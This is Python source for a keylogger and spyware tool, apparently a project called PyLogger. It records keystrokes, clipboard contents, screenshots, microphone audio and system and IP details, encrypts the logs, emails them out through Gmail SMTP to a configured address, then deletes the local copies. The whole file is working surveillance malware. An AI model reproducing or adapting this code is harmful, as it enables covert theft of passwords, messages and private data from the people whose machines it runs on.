# ------ Libraries ------
# Email libraries
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders

# System information gathering libraries
import socket
import platform

# Get clipboard library
import win32clipboard

# Library for grabbing key strokes
from pynput.keyboard import Key, Listener

# Library to track system time
import time
import os

# Library to access microphone
from scipy.io.wavfile import write
import sounddevice as sd

# Library to encrypt our files
from cryptography.fernet import Fernet

# Library to pass username and more PC info gathering
import getpass
from requests import get

# Library for screenshots
from multiprocessing import Process, freeze_support
from PIL import ImageGrab

#  ------ Variables ------
# Variables for our filepath/keylogger file
username = getpass.getuser()
keys_information = "key_log.txt"
file_path = "C:\\Users\\" + username + "\\PycharmProjects\\PyLogger\\PyLog"
extend = "\\"
file_merge = file_path + extend

# Variables for sending emails
email_address = ""
password = ""
toaddr = ""

# Variables for grabbing system information
system_information = "systeminfo.txt"
# Variables for grabbing clipboard information
clipboard_information = "clipboard.txt"
# Variables for grabbing an audio snippet
audio_information = "audio.wav"
microphone_time = 10
# Variables for grabbing a screenshot
screenshot_information = "screenshot.png"

# Variables for our encrypted files
keys_information_e = "e_key_log.txt"
system_information_e = "e_systeminfo.txt"
clipboard_information_e = "e_clipboard.txt"
key = ""

# Variables for time looping certain functions
time_iteration = 15
number_of_iterations_end = 3


#  ------ Functions ------
def send_email(filename, attachment, toaddr):
    fromaddr = email_address
    msg = MIMEMultipart()
    msg["From"] = fromaddr
    msg["To"] = toaddr
    msg["Subject"] = "Log_File"
    body = "Body_of_the_mail"
    msg.attach(MIMEText(body, "plain"))
    filename = filename
    attachment = open(attachment, "rb")
    p = MIMEBase("application", "octet-stream")
    p.set_payload((attachment).read())
    encoders.encode_base64(p)
    p.add_header("Content-Disposition", "Attachment; filename= %s" % filename)
    msg.attach(p)
    s = smtplib.SMTP("smtp.gmail.com", 587)
    s.starttls()
    s.login(email_address, password)
    text = msg.as_string()
    s.sendmail(fromaddr, toaddr, text)
    s.quit()


# send_email(keys_information, keys_information, toaddr)


def computer_information():
    with open(system_information, "a") as f:
        hostname = socket.gethostname()
        IPAddr = socket.gethostbyname(hostname)
        try:
            public_ip = get("https://api.ipify.org").text
            f.write("Public IP Address: " + public_ip + '\n')

        except Exception:
            f.write("Couldn't get Public IP Address (most likely max queries have been used)")

        f.write("Private IP Address: " + IPAddr + '\n')
        f.write("Processor: " + (platform.processor()) + '\n')
        f.write("System: " + platform.system() + " " + platform.version() + '\n')
        f.write("Machine: " + platform.machine() + '\n')
        f.write("Hostname: " + hostname + '\n')


# computer_information()


def copy_clipboard():
    with open(clipboard_information, "a") as f:
        try:
            win32clipboard.OpenClipboard()
            pasted_data = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()

            f.write("Clipboard Data: \n" + pasted_data)
        except:
            f.write("Clipboard could not be copied.")


# copy_clipboard()


def microphone():
    fs = 44100
    seconds = microphone_time

    myrecording = sd.rec(int(seconds * fs), samplerate=fs, channels=2)
    sd.wait()

    write(audio_information, fs, myrecording)


# microphone()


def screenshot():
    im = ImageGrab.grab()
    im.save(screenshot_information)


# screenshot()


number_of_iterations = 0
currentTime = time.time()
stoppingTime = time.time() + time_iteration


while number_of_iterations < number_of_iterations_end:

    count = 0
    keys = []

    def on_press(key):
        global keys, count, currentTime

        print(key)
        keys.append(key)
        count += 1
        currentTime = time.time()

        if count >= 1:
            count = 0
            write_file(keys)
            keys = []


    def write_file(keys):
        with open(keys_information, "a") as f:
            for key in keys:
                k = str(key).replace("'", "")
                if k.find("space") > 0:
                    f.write("\n")
                    f.close()
                elif k.find("Key") == -1:
                    f.write(k)
                    f.close()


    def on_release(key):
        if key == Key.esc:
            return False
        if currentTime > stoppingTime:
            return False


    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

    if currentTime > stoppingTime:

        with open(keys_information, "w") as f:
            f.write(" ")

        screenshot()
        # Arguments is Subject, File Location, To Address
        send_email(screenshot_information, screenshot_information, toaddr)

        copy_clipboard()

        number_of_iterations += 1

        currentTime = time.time()
        stoppingTime = time.time() + time_iteration


files_to_encrypt = [system_information, clipboard_information, keys_information]
encrypted_file_names = [system_information_e, clipboard_information_e, keys_information_e]

count = 0

for encrypting_files in files_to_encrypt:
    with open(files_to_encrypt[count], "rb") as f:
        data = f.read()

    fernet = Fernet(key)
    encrypted = fernet.encrypt(data)

    with open(encrypted_file_names[count], "wb") as f:
        f.write(encrypted)

    send_email(encrypted_file_names[count], encrypted_file_names[count], toaddr)
    count += 1

time.sleep(120)


delete_files = [system_information, clipboard_information, keys_information, screenshot_information, audio_information]
for file in delete_files:
    os.remove(file_merge + file)

